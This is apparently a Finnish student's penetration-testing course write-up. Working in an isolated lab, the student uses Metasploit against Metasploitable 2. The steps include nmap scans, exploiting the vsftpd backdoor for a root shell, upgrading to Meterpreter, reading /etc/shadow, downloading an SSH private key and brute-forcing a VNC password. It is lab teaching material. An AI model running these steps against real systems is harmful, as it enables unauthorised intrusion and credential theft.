# h2 Social sploit

Tehtävänanto: Karvinen, Tero. Tunkeutumistestaus. Julkaistu 10.5.2024. [https://terokarvinen.com/tunkeutumistestaus/](https://terokarvinen.com/tunkeutumistestaus/)

## x) Lue/katso/kuuntele ja tiivistä

Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit

- Metasploit Framework on avoimen lähdekoodin tunkeutumistestaustyökalu
- Sen käyttö on ketterää ja helppoa
- Automaattinen tallennus tietokantaan nopeuttaa testausta

####

- Exploits = Koodi, joka hyödyntää kohteessa olevaa haavoittuvuutta
- Payload = Koodi, joka suoritetaan kohteessa haavoittuvuuden hyödyntämisen jälkeen
- Auxiliary = Lisämoduulit, jotka mahdollistavat skannauksen, fuzzauksen, sieppaamisen ja muita toimintoja ilman varsinaista hyökkäystä
- Encoders = Käytetään moduulien hämärtämiseen, jotta ne välttäisivät suojamekanismit
- Meterpreter = Erääblainen payload, joka käyttää DLL-injektiota ja tarjoaa laajan valikoiman toimintoja kohteen hallintaan


#### Joitakin tärkeitä komentoja:

- help tai ?: Näyttää kaikki käytettävissä olevat komennot ja niiden kuvaukset
- search: Etsii moduuleja, kuten exploiteja ja payloadeja, hakusanalla
- use: Valitsee käytettävän moduulin
- show options: Näyttää valitun moduulin asetusvaihtoehdot
- set: Määrittää moduulille parametrit, esim. RHOSTS
- run tai exploit: Suorittaa valitun hyökkäyksen
- sessions: sessioiden hallintaa, esim. sessions -u [nro]: päivittää valitun session Meterpreter-sessioksi
- db_status: Tarkistaa tietokannan tilan ja yhteyden
- exit: Poistuu Metasploit-konsolista





## a) Harjoittelemme omassa virtuaaliverkossa, jossa on Kali ja Metaspoitable. Osoita testein, että 1) koneet eivät saa yhteyttä Internetiin 2) Koneet saavat yhteyden toisiinsa

Testasin, ettei Kali tai Metasploitable saa yhteyttä Internettiin ``ping 8.8.8.8`` ja että koneet saavat yhteyden toisiinsa ``ping 192.168.56.101`` ``ping 192.168.56.102``. Kumpikaan ei saanut yhteyttä Internettiin, mutta pingaus koneiden välillä onnistui.

![image](https://github.com/user-attachments/assets/53abff32-c356-4c79-91bb-aafff51e49fd)

![image](https://github.com/user-attachments/assets/7592da8f-5efa-48a0-97fb-5810ba4cba45)




## b) Ota Metasploit msfconsole käyttöön

Komennolla ``msfconsole`` sain konsolin käyttöön.

![image](https://github.com/user-attachments/assets/73b8b06f-566c-4fc8-8173-38d88b27cfa7)



## c) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable

Annoin tehtävänannon mukaisen komennon, mutta sain virheilmoituksen, jonka mukaan en ole yhteydessä tietokantaan. Löysin ohjeet tähän [https://miteshshah.github.io/linux/kali/how-to-fix-metasploit-database-not-connected-or-cache-not-built/](https://miteshshah.github.io/linux/kali/how-to-fix-metasploit-database-not-connected-or-cache-not-built/), ja lähdin kokeilemaan. Olin kuitenkin jo tunnilla alustanut tietokannan, joten en tiennyt missä kiikasti, not connected. 

![image](https://github.com/user-attachments/assets/4d8df782-c380-42cd-90d4-3fb669ebde98)


Käynnistin msfconsolen uudestaan ``exit`` -> ``msfconsole`` ja toistin komennon ``db_nmap -sn 192.168.56.1/24``, ja sitten se toimikin.

![image](https://github.com/user-attachments/assets/45efc1c8-f560-4ef4-9134-72af0b87258a)


Ja kyllä, porttiskannauksella löytynyt IP-osoite 192.168.56.102 oli kuin olikin Metasploitablen, ja sen näki selaimella.

![image](https://github.com/user-attachments/assets/485302cc-28bf-4cd3-b954-e03cc5186831)




## d) Porttiskannaa Metasploitable perusteellisesti. Tallenna tulokset Metasploitin tietokantoihin (db_nmap) ja tiedostoihin (nmap -oA foo)

Skannasin Metasploitablen portit komennolla ``db_nmap -p- -sV -A 192.168.56.102``. db tallentaa tietokantaan, -p- skannaa kaikki portit, sV tutkii palveluiden versiot, -A tunnistaa palvelun. Tutorialspointin [NMAP Cheat Sheetilta](https://www.tutorialspoint.com/nmap-cheat-sheet) voi tutkia, millaisia erilaisia nmap-komentoja on ja mitä tietoa niillä saa.

Sitten toistin komennon niin, että tulokset tallentuvat tiedostoihin: ``nmap -p- -sV -A -oA skannaus1 192.168.56.102``. -oA tallentaa skannauksen skannaus1-nimiseksi tiedostoksi. Lähdin tutkimaan, mihin tiedostot tallentuivat, ja ne löytyivätkin heti omasta kotihakemistosta. Tiedostomuotoja oli kolme erilaista: .gnmap, .nmap ja .xml.

![image](https://github.com/user-attachments/assets/47207469-3351-4615-86c0-7d2dc7259003)




## e) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä

Komennolla ``hosts`` näkyi tietokantaan tallennetun porttiskannauksen tallentamat IP-osoitteet.

![image](https://github.com/user-attachments/assets/123ca494-23a6-4a19-9475-ebfb5e601e51)


Komennolla ``services``näkyi tietokantaan tallennetun porttiskannauksen havaitsemat portit ja niitä kuuntelevat palvelut.

![image](https://github.com/user-attachments/assets/b21b9866-b050-46e5-a7fb-5fc06574dda5)


Komennoilla ``hosts -h`` ja ``services -h`` löysin erilaisia suodatusvaihtoehtoja. 

Esimerkiksi komento ``services -S http`` hakee kaikki palvelut, jotka sisältävät sanan http. Komento ``hosts --up`` näyttää päällä olevat laitteet.

![image](https://github.com/user-attachments/assets/c6d5033b-ba33-474a-9205-2c4c23bfc496)

![image](https://github.com/user-attachments/assets/98ba4136-ad6d-41e9-b2f8-7a2143e4b14f)




## f) Vertaile nmap:n omaa tiedostoon tallennusta ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet? (vastausta korjattu 1.12.2024)

Tiedosto.info, XML tiedostopääte – mitä XML-tiedostot ovat ja miten niitä käytetään? [https://tiedosto.info/extension/xml.html](https://tiedosto.info/extension/xml.html)

Nmap. Output Options. [https://nmap.org/book/man-output.html](https://nmap.org/book/man-output.html)

Nmap. Grepable output. [https://nmap.org/book/output-formats-grepable-output.html](https://nmap.org/book/output-formats-grepable-output.html)

Nmapin tiedostotallennus: Ihmisluettava muoto (-oN) on helppo tarkistaa, mutta vaikea parsia. Greppable-muoto (-oG) on nopea suodattaa, mutta tiedot ovat rajallisia. XML-muoto (-oX) tukee koneellista käsittelyä ja integrointia, mutta vaatii työkaluja tai ohjelmointia. db_nmap Metasploitissa: Tallentaa tulokset suoraan tietokantaan, mahdollistaen helpon integroinnin, hakutoiminnot, raportoinnin ja historian ylläpidon, joka sopii monenlaisten käyttäjien työskentelyyn ja tehokkaaseen analyysiin, mutta vaatii Metasploit-ympäristön ja enemmän resursseja. Tiedostot ovat yksinkertaisia käyttää, mutta tietokanta on tehokas laajemmassa käytössä ja integroinnissa.


## g) Murtaudu Metasploitablen vsftpd-palveluun

Suoritin tämän ensimmäisen kerran tunnilla, ja silloin käytin apuna tätä ohjetta: [https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173](https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173)

mfsconsolessa: 

- Etsin hyökkäyksen: ``search vsftpd``
- Valitsin hyökkäyksen (valitsin yhden esimerkeistä): ``use 1`` eli cmd/unix/interact
- Valitsin kohteen: ``set RHOSTS 192.168.56.102``
- Suoritin hyökkäyksen: ``run``
- ``whoami``, ``uname -a``-> olen root, Metasploitablen komentorivillä
  

![image](https://github.com/user-attachments/assets/1bc74376-e719-4442-bbdb-43582d7212b7)


## h) Päivitä äskeisen vsftpd-murron yhteydessä syntynyt sessio meterpretriin

Sitten etsin apua Meterpreterin käyttöön, sillä se on minulle täysin uusi. Löysin Youtube-tutoriaalin [Managing Sessions and using Meterpreter](https://www.youtube.com/watch?v=ApfRA0xLOo0) jota lähdin seuraamaan. 

Painamalla CTRL + Z jätin session päälle taustalle. ``sessions -h``löytyy lisää komentoja sessioiden hallintaan. Kokeilin komentoa ``sessions -l`` jolla saa listan päällä olevista sessioista.

![image](https://github.com/user-attachments/assets/6e327844-a563-4fac-99e8-e5f6b65a7c1e)


Komennolla ``sessions -u 1`` päivitin session Meterpreter-sessioksi. Nyt listaamalla sessiot näkyi listassa aiemman session lisäksi Meterpreter-sessio.

![image](https://github.com/user-attachments/assets/0ea91170-3d59-451e-922c-9ae2ddee1b90)


``sessions -i 2`` komennolla avasin Meterpreter-session. ``?`` komennolla näkyi lista Meterpreterillä käytettävistä komennoista. 




## i) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää

Jatkoin Meterpreter-sessiolla. ``sysinfo``-komennolla saatavia tietoja voi hyödyntää esimerkiksi silloin, jos käyttöjärjestelmää ei ole päivitetty, ja vanhassa versiossa on tunnettuja haavoittuvuuksia. Järjestelmäarkkitehtuuri vaikuttaa myös siihen, millaisia työkaluja voi käyttää.

![image](https://github.com/user-attachments/assets/74223f12-6af0-488f-bf25-67b37222eee0)


Hakemistoissa liikkumalla etsin tietoa käyttäjistä. Salasanojen tiivisteet löytyivät tiedostosta /etc/shadow. Salasanoja voi koettaa murtaa: jos salasanat ovat heikkoja, voi ne murtaa nopeasti hyödyntämällä jotakin työkalua, joka vertailee yleisimpien salasanojen tiivisteitä murrettaviin tiivisteisiin.

![image](https://github.com/user-attachments/assets/549d996d-c37a-4128-a6f8-33674b36a31e)

Kotihakemistoja selaamalla löytyi msfadmin-käyttäjän ssh-avaimia. ``/etc/ssh/ssh`` -kansiosta löytyi järjestelmäkohtaisia ssh-avaimia ja konfiguraatiotiedostoja, jolla hallinnoidaan ssh-yhteyksiä. Muokkaamalla ``sshd_config``-tiedostoa sallimaan yhteydet ulkopuolelta.

![image](https://github.com/user-attachments/assets/ad5e154b-c1e6-4a68-94ca-4fb292669e00)




## j) Murtaudu Metasploitableen jollain toisella tavalla

Etsin erilaisia tapoja murtautua ja löysin Youtubesta videon [How to Hack VNC Port 5900 | Metasploitable 2](https://www.youtube.com/watch?v=YDMxHU-PXSo&list=PLZEN0mW2CQl38fx0wtv53VEmn5CKJIrLA&index=5). Lähdin toteuttamaan siis tätä tapaa.

Ensin skannasin VNC-portin Metasploitablesta. ``nmap 192.168.56.102 -sV -p 5900`` Portti oli auki.

![image](https://github.com/user-attachments/assets/d4fb666b-be0c-41db-ab5c-78ed9df30842)

Tarkoitus oli käyttää VNC-skanneria, ja mfsconsolesta pystyi niitä hakemaan tarkennetulla haulla ``grep scanner search vnc``

![image](https://github.com/user-attachments/assets/d0ee165b-2737-444c-8ef8-66bed9ad348b)

Vaihtoehdoista tuli valita login scanner. ``use 109``. ``show options``-komento näyttää määriteltäviä asetuksia.

![image](https://github.com/user-attachments/assets/d73d5377-b76e-4f0e-9ae4-0e4f59a47b5a)

Määritin RHOSTS ``set RHOSTS 192.168.56.102`` eli kohteeksi Metasploitable. Options-listassa näkyy defaultina tiedosto PASS_FILE, joka sisältää listan yleisimpiä salasanoja: skanneri koettaa näitä salasanoja murtaakseen VNC-palvelimen. Tähän kohtaan voi kokeilla muitakin listoja, mutta pidin tämän oletuslistan. 

Womp womp. Salasana oli password. Tässä hyökkäyksessä käytetään brute forcea.

![image](https://github.com/user-attachments/assets/b4e5f608-2cee-43f3-8347-c1d088d4f7f0)



## k) Demonstroi Meterpretrin ominaisuuksia

Toistin aiemman tehtävän vsftpd-session ja päivitin sen Meterpreter-sessioksi. ``help`` -komennolla näkee listan komennoista. Kokeilin ladata tiedoston Metasploitablen msfadmin-käyttäjän kotihakemistosta. Latasin tiedoston id_rsa. 

![image](https://github.com/user-attachments/assets/bf404be9-0c3d-4327-8398-c097bb380829)

Tiedosto tallentui Kali-koneelle.

![image](https://github.com/user-attachments/assets/ad43835c-e13d-42e1-80d5-50255190aae5)


## l) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt)

Aloitin session tallentamisen komennolla ``script -fa log001.txt``. Tein välissä samoja asioita kuin ylemmissä tehtävissä, ja lopetin tallennuksen sitten exit-komennolla.

![image](https://github.com/user-attachments/assets/f2bb9502-1d1d-40ff-8dc0-4c9b2228b100)


### Lisäys kohtaan j. tunkeutuminen Metasploitableen hankitulla salasanalla. Jatkettu 8.11.2024.

Etsin erillisen oppaan, jossa oli ohjeet salasanan hankkimiseen sekä sen hyödyntämiseen VNC-viewerillä: [Cybertech Maven. Penetration Testing Series: Hacking Metasploitable 2 By Exploiting VNC Port 5900. 19.7.2023.](https://medium.com/@jbtechmaven/penetration-testing-series-hacking-metasploitable-2-by-exploiting-vnc-port-5900-188f7cc44b8) Olin aiemmin tehnyt jo suurimman työn, joten periaatteessa piti vain avata VNC ja kirjautua.

Salasana VNC-palveluun oli ``password``.

VNC-viewerillä etäyhteyden Metasploitableen sai auki komennolla ``vncviewer 192.168.56.102``. Salasanan syöttämisen jälkeen oltiin sisällä.


![image](https://github.com/user-attachments/assets/03c81531-2159-4135-8a23-e1cdd604ce50)





## Lähteet

Lähteet luettu 6.11.2024.


Tehtävänanto: Karvinen, Tero. Tunkeutumistestaus. Julkaistu 10.5.2024. [https://terokarvinen.com/tunkeutumistestaus/](https://terokarvinen.com/tunkeutumistestaus/)

Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit [https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31](https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31)

Shah, M., How to fix Metasploit database not connected or cache not built. [https://miteshshah.github.io/linux/kali/how-to-fix-metasploit-database-not-connected-or-cache-not-built/](https://miteshshah.github.io/linux/kali/how-to-fix-metasploit-database-not-connected-or-cache-not-built/)

Tutorialspoint, Nmap Cheat Sheet. [https://www.tutorialspoint.com/nmap-cheat-sheet](https://www.tutorialspoint.com/nmap-cheat-sheet)

Tiedosto.info, XML tiedostopääte – mitä XML-tiedostot ovat ja miten niitä käytetään? [https://tiedosto.info/extension/xml.html](https://tiedosto.info/extension/xml.html)

Nmap. Grepable output. [https://nmap.org/book/output-formats-grepable-output.html](https://nmap.org/book/output-formats-grepable-output.html)

Nmap. Output Options. [https://nmap.org/book/man-output.html](https://nmap.org/book/man-output.html)

Jacobs, J. J., Exploiting vsftpd in Metasploitable 2, Medium. Julkaistu 10.11.2019. [https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173](https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173)

Cybertech Maven. Penetration Testing Series: Hacking Metasploitable 2 By Exploiting VNC Port 5900. 19.7.2023.[https://medium.com/@jbtechmaven/penetration-testing-series-hacking-metasploitable-2-by-exploiting-vnc-port-5900-188f7cc44b8](https://medium.com/@jbtechmaven/penetration-testing-series-hacking-metasploitable-2-by-exploiting-vnc-port-5900-188f7cc44b8) Lähde luettu 8.11.2024.
